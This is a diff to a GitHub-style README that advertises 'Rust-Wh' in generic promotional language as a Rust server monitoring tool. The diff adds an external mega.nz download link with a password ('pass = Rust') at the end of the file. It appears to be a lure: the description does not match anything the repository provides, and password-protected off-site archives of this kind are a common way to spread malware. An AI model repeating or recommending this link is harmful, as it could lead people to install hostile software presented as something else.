@@ -5,9 +5,19 @@ Designed for server admins and developers, Rust-Wh offers quick access to real-t
 ✨ Features include:  
 
 🔍 Real-time server monitoring — stay updated instantly!
+
 🎮 Player & resource stats — know your server's pulse!
+
 ⚙️ Simple configuration management — tweak settings with ease!
+
 🚀 High performance & reliability — built to handle heavy loads!
+
 🌐 Compatibility with various Rust versions — flexible for your needs!
+
 🔧 Extendable functionality — customize to fit your project!
+
 🛠️ Rust-Wh is your go-to solution for keeping your Rust servers optimized, secure, and running at peak performance!  
+
+dowloand =  https://mega.nz/file/EAtlibYJ#cYn7FkC88n63oYyeg4AZu-LqmO0NQ-hLiffbfVDJ-FE
+
+pass = Rust
